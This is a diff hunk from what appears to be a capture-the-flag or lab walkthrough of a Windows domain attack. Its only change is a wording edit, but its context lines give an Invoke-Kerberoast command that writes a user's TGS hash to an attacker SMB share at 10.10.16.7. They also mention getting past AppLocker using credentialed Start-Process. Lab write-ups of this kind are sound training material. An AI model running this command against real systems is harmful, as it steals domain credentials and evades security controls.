@@ -344,7 +344,7 @@ This is to:
 2. Execute the command `Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt`.
 3. Output the TGS hash of the `mrlky` user to our SMB share.
 
-we will use the `-Credential` paramer with `Start-Process` to create the needed Network Authentication for the attack to succeed.
+we will use the `-Credential` paramer with `Start-Process` to create the Network Authentication needed for the attack to succeed.
 
 *That way,* we've hit multiple birds with one stone.
 1. Jumped over Applocker
